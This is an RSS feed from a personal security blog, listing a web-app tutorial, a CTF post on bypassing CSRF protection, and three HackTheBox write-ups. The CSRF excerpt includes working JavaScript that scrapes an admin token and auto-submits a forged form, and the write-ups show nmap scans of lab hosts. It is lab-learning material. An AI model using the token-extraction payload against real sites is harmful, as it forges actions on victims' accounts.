<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on Ajdin.io</title>
    <link>https://ajdin.io/posts/</link>
    <description>Recent content in Posts on Ajdin.io</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <lastBuildDate>Fri, 03 Jul 2020 00:00:00 +0000</lastBuildDate>
    
	<atom:link href="https://ajdin.io/posts/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Building a Simple Web App with Postgres, React and Express</title>
      <link>https://ajdin.io/posts/webdev/</link>
      <pubDate>Fri, 03 Jul 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ajdin.io/posts/webdev/</guid>
      <description>Introduction I&amp;rsquo;ll be building a simple web application to log workers activity. I&amp;rsquo;ll be using PostgresSQL for database, React for frontend and Express for routing the app.
Functionality TODO: add functionality after the web app is built
Setting up the environment I&amp;rsquo;m running Arch Linux, so this part will be Linux specific.
Postgres Thanks to Archwiki, this is easy:
 Install the PostgreSQL package:  sudo pacman -S postgresql Now this will also create an new user postgres.</description>
    </item>
    
    <item>
      <title>CSRF :: Token Extraction</title>
      <link>https://ajdin.io/posts/csrf-bypass-token-with-xss/</link>
      <pubDate>Thu, 07 May 2020 00:43:19 +0200</pubDate>
      
      <guid>https://ajdin.io/posts/csrf-bypass-token-with-xss/</guid>
      <description>So I was doing a CTF challenge and I have learned how to bypass CSRF token protection with extracting the token. I had to remove the CSRF code as the CTF forbids leaking solutions.
&amp;lt;form action=&amp;#34;&amp;lt;url goes here&amp;gt;&amp;#34; method=&amp;#34;post&amp;#34; name=&amp;#34;csrf&amp;#34; enctype=&amp;#34;multipart/form-data&amp;#34;&amp;gt; &amp;lt;input ... /&amp;gt; &amp;lt;input id=&amp;#34;token&amp;#34; type=&amp;#34;hidden&amp;#34; name=&amp;#34;token&amp;#34; value=&amp;#34;&amp;#34; /&amp;gt; &amp;lt;button type=&amp;#34;submit&amp;#34;&amp;gt;Submit&amp;lt;/button&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;script&amp;gt; xhttp = new XMLHttpRequest(); xhttp.open(&amp;#34;GET&amp;#34;, &amp;#34;&amp;lt;url goes here&amp;gt;&amp;#34;, false); xhttp.send(); token_admin = (xhttp.responseText.match(/[abcdef0123456789]{32}/)); document.getElementById(&amp;#39;token&amp;#39;).setAttribute(&amp;#39;value&amp;#39;, token_admin) document.csrf_form.submit(); &amp;lt;/script&amp;gt; What is this token?</description>
    </item>
    
    <item>
      <title>HackTheBox Openadmin Write Up</title>
      <link>https://ajdin.io/posts/htb/openadmin/</link>
      <pubDate>Sat, 02 May 2020 09:03:27 +0200</pubDate>
      
      <guid>https://ajdin.io/posts/htb/openadmin/</guid>
      <description>Reconnaissance Let&amp;rsquo;s see what have we got here with nmap.
nmap -sC -sV -O -oA nmap/initial 10.10.10.171 -sC: run default script scan -sV: probe open ports to determine service/version info -O: OS detection -oA: output OS detection, version detection, script scanning, and traceroute Nmap returns the results quick as it by default scans only for most popular 1000 ports, so lets scan all the ports while we investigate the initial nmap scan.</description>
    </item>
    
    <item>
      <title>HackTheBox Mango Write Up</title>
      <link>https://ajdin.io/posts/htb/mango/</link>
      <pubDate>Sat, 18 Apr 2020 13:28:11 +0200</pubDate>
      
      <guid>https://ajdin.io/posts/htb/mango/</guid>
      <description>Reconnaissance Let’s run nmap,
sudo nmap -sV -sC -O -oA nmap/initial 10.10.10.162 We have to use https for this website on port 80, and we can get this “search page”. We can see some kind of analytics page in the top right corner.
Getting user account I checked the /robots.txt, also ran gobuster, nothing useful there. The SSL certificate wasn’t valid so I took a look a there and we have a page reference: staging-order.</description>
    </item>
    
    <item>
      <title>HackTheBox Postman Write Up</title>
      <link>https://ajdin.io/posts/htb/postman/</link>
      <pubDate>Fri, 13 Mar 2020 13:28:11 +0200</pubDate>
      
      <guid>https://ajdin.io/posts/htb/postman/</guid>
      <description>Reconnaissance Let’s run a quick nmap scan as always.
# nmap -sV -sC -O -oA nmap/initial 10.10.10.160 Short explanation:
-sV Version detection -sC Script scan -O Enable OS detection -oA Output to all formats For a more detailed explanation click here.
While I wait for this to be finished I’ll start a full nmap scan.
# nmap -sV -sC -O -p- -oA nmap/initial 10.10.10.160 As usual we have port 22 and port 80 running, but here we also have http protocol running on port 10000, let’s enumerate on those pages.</description>
    </item>
    
  </channel>
</rss>